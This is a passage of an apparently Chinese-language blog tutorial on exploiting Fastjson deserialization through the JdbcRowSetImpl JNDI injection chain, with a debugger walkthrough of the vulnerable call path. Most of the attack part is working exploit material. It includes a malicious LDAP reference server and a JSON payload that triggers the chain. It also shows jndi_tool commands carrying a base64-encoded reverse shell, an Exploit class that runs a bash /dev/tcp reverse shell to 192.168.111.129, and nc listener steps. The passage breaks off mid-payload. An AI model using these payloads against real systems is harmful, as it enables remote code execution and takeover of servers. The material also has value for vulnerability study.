class="token punctuation">)</span><span class="token punctuation">,</span>\n                    port<span class="token punctuation">,</span>\n                    <span class="token class-name">ServerSocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n                    <span class="token class-name">SocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n                    <span class="token punctuation">(</span><span class="token class-name">SSLSocketFactory</span><span class="token punctuation">)</span> <span class="token class-name">SSLSocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n            config<span class="token punctuation">.</span><span class="token function">addInMemoryOperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token class-name">InMemoryDirectoryServer</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServer</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Listening on 0.0.0.0:&quot;</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n        <span class="token punctuation">}</span>\n        <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">Exception</span> e <span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OperationInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">InMemoryOperationInterceptor</span> <span class="token punctuation">{</span>\n\n        <span class="token keyword">private</span> <span class="token class-name">URL</span> codebase<span class="token punctuation">;</span>\n\n\n        <span class="token doc-comment comment">/**\n         *\n         */</span>\n        <span class="token keyword">public</span> <span class="token class-name">OperationInterceptor</span> <span class="token punctuation">(</span> <span class="token class-name">URL</span> cb <span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">this</span><span class="token punctuation">.</span>codebase <span class="token operator">=</span> cb<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n\n        <span class="token doc-comment comment">/**\n         * <span class="token punctuation">{</span><span class="token keyword">@inheritDoc</span><span class="token punctuation">}</span>\n         *\n         * <span class="token keyword">@see</span> <span class="token reference"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryOperationInterceptor</span><span class="token punctuation">#</span><span class="token function">processSearchResult</span><span class="token punctuation">(</span><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryInterceptedSearchResult</span><span class="token punctuation">)</span></span>\n         */</span>\n        <span class="token annotation punctuation">@Override</span>\n        <span class="token keyword">public</span> <span class="token keyword">void</span> processSearchResult <span class="token punctuation">(</span> <span class="token class-name">InMemoryInterceptedSearchResult</span> result <span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token class-name">String</span> base <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBaseDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token class-name">Entry</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">try</span> <span class="token punctuation">{</span>\n                <span class="token function">sendResult</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> base<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n            <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">Exception</span> e1 <span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                e1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n\n        <span class="token punctuation">}</span>\n\n\n        <span class="token keyword">protected</span> <span class="token keyword">void</span> sendResult <span class="token punctuation">(</span> <span class="token class-name">InMemoryInterceptedSearchResult</span> result<span class="token punctuation">,</span> <span class="token class-name">String</span> base<span class="token punctuation">,</span> <span class="token class-name">Entry</span> e <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">LDAPException</span><span class="token punctuation">,</span> <span class="token class-name">MalformedURLException</span> <span class="token punctuation">{</span>\n            <span class="token class-name">URL</span> turl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">&#39;.&#39;</span><span class="token punctuation">,</span> <span class="token char">&#39;/&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">&quot;.class&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Send LDAP reference result for &quot;</span> <span class="token operator">+</span> base <span class="token operator">+</span> <span class="token string">&quot; redirecting to &quot;</span> <span class="token operator">+</span> turl<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;javaClassName&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token class-name">String</span> cbstring <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">int</span> refPos <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token char">&#39;#&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">if</span> <span class="token punctuation">(</span> refPos <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>\n                cbstring <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> refPos<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token punctuation">}</span>\n            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;javaCodeBase&quot;</span><span class="token punctuation">,</span> cbstring<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;objectClass&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;javaNamingReference&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;javaFactory&quot;</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            result<span class="token punctuation">.</span><span class="token function">sendSearchEntry</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            result<span class="token punctuation">.</span><span class="token function">setResult</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LDAPResult</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token class-name">ResultCode</span><span class="token punctuation">.</span><span class="token constant">SUCCESS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Exploit 类不变，更改 poc 协议。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;, \\&quot;autoCommit\\&quot;:true}&quot;</span><span class="token punctuation">;</span>\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token comment">// JSON.parse(payload); // 这样也行</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+V+'" alt="image" loading="lazy">​</p><p>出错，改一下 ldapserver 的实现请求类名即可。</p><p>​<img src="'+Q+'" alt="image" loading="lazy">​</p><p>​<img src="'+X+'" alt="image" loading="lazy">​</p><ul><li>​<code>this.codebase.getRef()</code>​：<code>getRef()</code>​ 方法用于获取 URL 中的引用部分（即 URL 中的 <code>#</code>​ 号后面的部分</li><li>​<code>replace(&#39;.&#39;, &#39;/&#39;)</code>​：这一步是将引用部分中的 <code>.</code>​ 字符替换为 <code>/</code>​ 字符。在 Java 类文件的 URL 表示中，包名通常用路径表示，因此需要将 <code>.</code>​ 替换为 <code>/</code>​</li><li>​<code>concat(&quot;.class&quot;)</code>​：在 Java 中，类文件的名称通常以 <code>.class</code>​ 作为扩展名。因此，这一步是将类名字符串后面追加 <code>.class</code>​ 扩展名</li></ul><h4 id="调试分析-1" tabindex="-1"><a class="header-anchor" href="#调试分析-1"><span>调试分析</span></a></h4><p>这里只分析 fastjson 触发 com.sun.rowset.JdbcRowSetImpl 这条 JNDI 注入利用链的过程。</p><p>前面的函数调用过程和基于 TemplateImpl 的调试分析几乎是一样的，只看下区别的地方。</p><p>调用 <code>scanSymbol()</code>​ 函数扫描到 <code>com.sun.rowset.JdbcRowSetImpl</code>​ 类后，再调用 <code>TypeUtils.loadClass()</code>​ 函数将该类加载进来。</p><p>​<img src="'+Z+'" alt="image" loading="lazy">​</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code>parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)\nparse:137, JSON (com.alibaba.fastjson)\nparse:193, JSON (com.alibaba.fastjson)\nmain:9, JdbcRowSetImplPoc (demo)\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>往下调试，调用了 <code>FastjsonASMDeserializer.deserialze()</code>​ 函数对该类进行反序列化操作。</p><p>​<img src="'+H+'" alt="image" loading="lazy">​</p><p>继续往下调试，就是 ASM 机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。</p><blockquote><p>ASM 是一个 Java 字节码操控框架。它能被用来动态生成类或者增强既有类的功能。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。</p><p>Java class 被存储在严格格式定义的 <code>.class</code>​ 文件里，这些类文件拥有足够的元数据来解析类中的所有元素：类名称、方法、属性以及 Java 字节码（指令）。ASM 从类文件中读入信息后，能够改变类行为，分析类信息，甚至能够根据用户要求生成新类。</p></blockquote><p>或者根据前面的分析在 <code>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</code>​ --&gt; <code>value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);</code>​ --&gt;</p><p>​<code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue</code>​ 处下一个断点。</p><p>​<img src="'+K+'" alt="image" loading="lazy">​</p><p>由于 Poc 设置了 <code>dataSourceName</code>​ 键值和 <code>autoCommit</code>​ 键值，因此在 JdbcRowSetImpl 中的 <code>setDataSourceName()</code>​ 和 <code>setAutoCommit()</code>​ 函数都会被调用，因为它们均满足前面说到的 Fastjson 在反序列化时会自动调用的 setter 方法的特征。</p><p>先是调试到了 <code>com.sun.rowset.JdbcRowSetImpl#setDataSourceName</code>​​ 函数，将 dataSourceName 值设置为目标 RMI 服务的地址。</p><p>​<img src="'+$+'" alt="image" loading="lazy">​</p><p>​<img src="'+nn+'" alt="image" loading="lazy">​</p><p>接着调用到 <code>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</code>​ 函数（断点），设置 autoCommit 值，其中调用了 <code>com.sun.rowset.JdbcRowSetImpl#connect</code>​ 函数。</p><p>​<img src="'+sn+'" alt="image" loading="lazy">​</p><p>可以看到 JNDI 注入的代码即 <code>InitialContext.lookup()</code>​​，并且其参数是调用 <code>this.getDataSourceName()</code>​​ 获取的、即在前面 <code>setDataSourceName()</code>​​ 函数中设置的值，因此 lookup 参数外部可控，导致存在 JNDI 注入漏洞。最后，成功利用 JNDI 注入触发 Fastjson 反序列化漏洞、达到任意命令执行效果。</p><p>【<strong>调用栈如下】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>connect<span class="token operator">:</span><span class="token number">624</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImpl</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">)</span>\nsetAutoCommit<span class="token operator">:</span><span class="token number">4067</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImpl</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">)</span>\ninvoke0<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">NativeMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>\ninvoke<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token class-name">NativeMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>\ninvoke<span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token class-name">DelegatingMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>\ninvoke<span class="token operator">:</span><span class="token number">483</span><span class="token punctuation">,</span> <span class="token class-name">Method</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>\nsetValue<span class="token operator">:</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token class-name">FieldDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\nparseField<span class="token operator">:</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token class-name">DefaultFieldDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\nparseField<span class="token operator">:</span><span class="token number">773</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\ndeserialze<span class="token operator">:</span><span class="token number">600</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\nparseRest<span class="token operator">:</span><span class="token number">922</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\ndeserialze<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">FastjsonASMDeserializer_1_JdbcRowSetImpl</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\ndeserialze<span class="token operator">:</span><span class="token number">184</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>\nparseObject<span class="token operator">:</span><span class="token number">368</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">1327</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">1293</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">137</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nparse<span class="token operator">:</span><span class="token number">193</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>\nmain<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">(</span>demo<span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="工具" tabindex="-1"><a class="header-anchor" href="#工具"><span>工具</span></a></h2>',33),yn={href:"https://github.com/wyzxxz/jndi_tool",target:"_blank",rel:"noopener noreferrer"},fn={href:"https://github.com/mbechler/marshalsec",target:"_blank",rel:"noopener noreferrer"},hn=(0,t.Fv)('<p>‍</p><p><strong>【启动 RMI server】</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span> <span class="token function">java</span> <span class="token parameter variable">-jar</span> .<span class="token punctuation">\\</span>jndi_tool.jar\n\n<span class="token operator">&gt;</span> <span class="token function">java</span> <span class="token parameter variable">-cp</span> jndi_tool.jar jndi.HRMIServer  攻击机<span class="token punctuation">(</span>服务器<span class="token punctuation">)</span>_IP 端口 <span class="token string">&quot;要执行的命令&quot;</span>\n\n<span class="token operator">&gt;</span> <span class="token function">java</span> <span class="token parameter variable">-cp</span> jndi_tool.jar jndi.HRMIServer  <span class="token number">192.168</span>.111.129 <span class="token number">9999</span> <span class="token string">&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xMjkvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}&quot;</span>\nPicked up JAVA_TOOL_OPTIONS: <span class="token parameter variable">-Dfile.encoding</span><span class="token operator">=</span>UTF-8\n<span class="token punctuation">[</span>-<span class="token punctuation">]</span> payload:  <span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="token string">&quot;dataSourceName&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;rmi://192.168.111.129:9999/Object&quot;</span>,<span class="token string">&quot;autoCommit&quot;</span>:true<span class="token punctuation">}</span>\n<span class="token punctuation">[</span>-<span class="token punctuation">]</span> payload:  <span class="token punctuation">{</span><span class="token string">&quot;e&quot;</span>:<span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;java.lang.Class&quot;</span>,<span class="token string">&quot;val&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">}</span>,<span class="token string">&quot;f&quot;</span>:<span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="token string">&quot;dataSourceName&quot;</span><span class="token builtin class-name">:</span><span class="token string">&quot;rmi://192.168.111.129:9999/Object&quot;</span>,<span class="token string">&quot;autoCommit&quot;</span>:true<span class="token punctuation">}</span><span class="token punctuation">}</span>\n<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Opening JRMP listener on <span class="token number">9999</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>注：</strong> 如果是反弹 shell 的命令，需要将其进行编码。管道符，输入输出重定向，只有在 bash 环境下才能用。而在这里，我们使用的是 java 为我们提供的命令执行环境，不支持管道符，输入输出重定向等，因此需要 base64 编码一下。</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>// 反弹 shell 命令\n<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.111.129/6666 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【Evil 字节码】</strong></p><p>利用 JNDI 注入加载远程 RMI server 上的字节码。</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>//javac Exploit.java\n<span class="token function">import</span> java.lang.Runtime<span class="token punctuation">;</span>\n<span class="token function">import</span> java.lang.Process<span class="token punctuation">;</span>\n\npublic class Exploit <span class="token punctuation">{</span>\n    public <span class="token function-name function">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n        try<span class="token punctuation">{</span>\n            Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash -c <span class="token variable">$@</span>|bash 0 echo bash -i &amp;gt;&amp; /dev/tcp/192.168.111.129/6666 0&amp;gt;&amp;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>catch<span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>\n            e.printStackTrace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n    public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        Exploit e <span class="token operator">=</span> new Exploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li>编译：<code>javac Exploit.java</code>​</li><li>在攻击机开启监听：<code>nc -lvvp 6666</code>​</li><li>发送 payload</li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token punctuation">{</span>\n    <span class="token string">&quot;b&quot;</span>:<span class="token 